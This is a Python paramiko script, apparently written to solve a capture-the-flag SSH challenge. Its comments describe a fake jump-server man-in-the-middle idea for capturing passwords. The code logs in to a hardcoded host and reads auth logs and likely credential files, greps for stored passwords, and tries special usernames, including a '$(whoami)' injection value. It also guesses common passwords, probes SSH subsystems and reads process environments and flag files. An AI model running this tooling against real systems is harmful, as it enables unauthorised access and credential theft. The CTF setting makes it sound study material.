import paramiko
import socket
import time
import sys
import hashlib

"""
重新思考FakeJumpServer攻击：

在真实的FakeJumpServer攻击中：
1. 攻击者控制跳板机
2. 用户通过跳板机（-J选项）连接到目标
3. 跳板机可以：
   - 伪造目标服务器的身份（返回自己的公钥）
   - 捕获用户的密码
   - 进行中间人攻击

在这个CTF中：
- dropbear在容器外运行
- 当请求转发到localhost:22时，dropbear返回自己
- 172.17.0.1是真实的Ubuntu主机

关键点：
如果dropbear伪造localhost的响应，那么当有人通过ProxyJump连接时：
ssh -J ctf@challenge:55300 target@localhost

他们实际上会：
1. 连接到dropbear
2. dropbear返回它自己作为"localhost"
3. 用户的密码可能被捕获到某处！

让我检查是否有日志或捕获的凭据

另一个思路：
也许dropbear有一个特殊的用户名可以触发某种行为
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令"""
    try:
        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
        return stdout.read().decode() + stderr.read().decode()
    except Exception as e:
        return f"Error: {e}"

def check_for_captured_creds():
    """检查是否有捕获的凭据"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查可能的凭据存储位置")
    
    # 常见的日志和凭据存储位置
    paths = [
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/messages",
        "/var/log/dropbear*",
        "/var/log/ssh*",
        "/tmp/creds*",
        "/tmp/captured*",
        "/tmp/passwords*",
        "/tmp/*.log",
        "/root/creds*",
        "/root/captured*",
        "/home/*/creds*",
        "~/.ssh_creds",
        "/var/run/dropbear*",
    ]
    
    for path in paths:
        result = exec_cmd(ssh, f"cat {path} 2>/dev/null")
        if result and "Error" not in result and "No such" not in result:
            print(f"\n{path}:")
            print(result[:500])
    
    # 搜索包含password的文件
    result = exec_cmd(ssh, "grep -r -l password /tmp /var /root 2>/dev/null")
    if result:
        print(f"\n包含'password'的文件: {result}")
    
    ssh.close()

def test_special_usernames():
    """测试特殊用户名"""
    
    print("\n[*] 测试特殊用户名")
    
    special_users = [
        "root",
        "admin",
        "flag",
        "ssh",
        "dropbear",
        "test",
        "guest",
        "user",
        # ProxyJump相关
        "proxy",
        "jump",
        "target",
        "dest",
        # 环境变量相关
        "$USER",
        "$(whoami)",
        # 特殊字符
        "ctf@localhost",
        "ctf%localhost",
        "ctf:localhost",
    ]
    
    for username in special_users:
        try:
            print(f"\n尝试用户名: {username}")
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                ssh.connect(HOST, PORT, username, PASSWD, timeout=5, banner_timeout=5)
                
                # 如果连接成功，检查环境
                result = exec_cmd(ssh, "whoami; id")
                print(f"成功! whoami: {result}")
                
                ssh.close()
            except paramiko.AuthenticationException as e:
                print(f"认证失败: {e}")
            except Exception as e:
                print(f"错误: {type(e).__name__}: {e}")
                
        except Exception as e:
            print(f"连接错误: {e}")

def test_password_variations():
    """测试密码变体"""
    
    print("\n[*] 测试密码变体")
    
    passwords = [
        "123456",
        "password",
        "flag",
        "",
        "admin",
        "root",
        "ctf",
        "ssh",
    ]
    
    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                ssh.connect(HOST, PORT, USER, password, timeout=5, banner_timeout=5)
                print(f"密码 '{password}' 成功!")
                ssh.close()
            except paramiko.AuthenticationException:
                pass  # 静默处理认证失败
            except Exception as e:
                print(f"密码 '{password}' 错误: {e}")
                
        except Exception as e:
            print(f"连接错误: {e}")

def examine_ssh_banner():
    """仔细检查SSH banner"""
    
    print("\n[*] 检查SSH banner和服务器信息")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    
    # 接收banner
    banner = sock.recv(1024)
    print(f"原始banner: {banner}")
    
    # 发送我们的banner
    sock.send(b"SSH-2.0-OpenSSH_8.9\r\n")
    
    # 接收KEX init
    try:
        kex = sock.recv(4096)
        print(f"KEX init ({len(kex)} bytes): {kex[:100]}...")
    except:
        pass
    
    sock.close()

def test_subsystem_execution():
    """测试subsystem执行"""
    
    print("\n[*] 测试subsystem执行")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 测试不同的subsystem
    subsystems = [
        "sftp",
        "netconf",
        "shell",
        "exec",
        "flag",
        "admin",
        "debug",
    ]
    
    for subsystem in subsystems:
        try:
            channel = transport.open_session()
            channel.settimeout(5)
            
            result = channel.invoke_subsystem(subsystem)
            print(f"subsystem '{subsystem}': {result}")
            
            # 尝试读取输出
            time.sleep(0.5)
            if channel.recv_ready():
                data = channel.recv(4096)
                print(f"  输出: {data}")
            
            channel.close()
        except Exception as e:
            print(f"subsystem '{subsystem}': {e}")
    
    ssh.close()

def test_command_injection_in_exec():
    """测试exec命令注入"""
    
    print("\n[*] 测试命令执行变体")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 测试不同的命令格式
    commands = [
        "id",
        "/bin/sh",
        "/bin/ash",
        "cat /flag*",
        "ls -la /",
        "find / -name flag* 2>/dev/null",
        "cat /proc/1/environ",
        "cat /proc/1/cmdline",
        "ps aux",
    ]
    
    for cmd in commands:
        result = exec_cmd(ssh, cmd)
        if result and "Error" not in result:
            result_short = result[:200] if len(result) > 200 else result
            print(f"\n{cmd}:")
            print(result_short)
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深度SSH特性测试")
    print("="*60)
    
    examine_ssh_banner()
    
    print("\n" + "="*60)
    print("[*] 测试凭据捕获")
    print("="*60)
    check_for_captured_creds()
    
    print("\n" + "="*60)
    print("[*] 测试命令执行")
    print("="*60)
    test_command_injection_in_exec()
    
    print("\n" + "="*60)
    print("[*] 测试subsystem")
    print("="*60)
    test_subsystem_execution()
